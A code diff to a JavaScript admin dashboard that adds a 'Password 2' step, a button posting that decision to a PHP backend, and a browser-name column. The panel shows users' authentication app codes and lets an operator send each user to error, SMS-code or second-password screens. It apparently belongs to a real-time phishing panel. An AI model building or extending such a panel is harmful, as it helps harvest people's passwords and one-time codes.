@@ -242,6 +242,9 @@
 							}else if(item.admin_decision == 3){
 								string += '<td>App Athentication</td>' + 
 											'<td>' + ((item.auth_app_code == "null")?"":item.auth_app_code) + '</td>'; 
+							}else if(item.admin_decision == 4){
+								string += '<td>Password2</td>' + 
+											'<td></td>'; 
 							}else{
 								string += '<td></td>' + 
 											'<td></td>'; 
@@ -257,6 +260,10 @@
 										'<input type="hidden" value="' + item.id + '">' + 
 										'<button type="button" class="btn btn-danger btn-sm btn-final-error">Error-Response</button>' + 
 										'<br>' + 
+										'<input type="hidden" value="' + item.admin_decision + '">' + 
+										'<input type="hidden" value="' + item.id + '">' + 
+										'<button type="button" class="btn btn-info btn-sm btn-final-second-password">Password 2</button>' + 
+										'<br>' +
 										'<input type="hidden" value="' + item.admin_decision + '">' + 
 										'<input type="hidden" value="' + item.id + '">' + 
 										'<button type="button" class="btn btn-info btn-sm btn-final-sms-auth">SMS Auth</button>' + 
@@ -286,7 +293,7 @@
 										// 	'<button type="button" class="btn btn-warning btn-sm">Exit</button>' + 
 										// '</a>' + 
 									'</td>'+
-									'<td>' + item.ip + '</td>' + 
+									'<td>' + item.ip + '<br>' + item.browser_name + '</td>' + 
 									'<td>' + item.time + '</td>' + 
 								'</tr>';
 
@@ -424,6 +431,26 @@
             url: "./saveFinalDecision.php",
             method: 'POST',
             data: {user_id: user_id, decision:2},
+            success: function(result){
+              if(result != 0){
+                fnShowSnackbar();
+                // fnGetUpdatedData();
+                clearInterval(timerForGetUpdatedData);
+                timerForGetUpdatedData = setInterval(fnGetUpdatedData, 3000);
+              }
+            }
+          });
+	  })
+	  $(document).on('click', 'button.btn-final-second-password', function(){
+		var admin_decision = $(this).prev().prev().val();
+		if(admin_decision == "null") return;
+        // var digipas = $(this).parent().find("span.digipas").text();
+        var user_id = $(this).prev().val();
+        console.log(user_id);
+          $.ajax({
+            url: "./saveFinalDecision.php",
+            method: 'POST',
+            data: {user_id: user_id, decision:5},
             success: function(result){
               if(result != 0){
                 fnShowSnackbar();
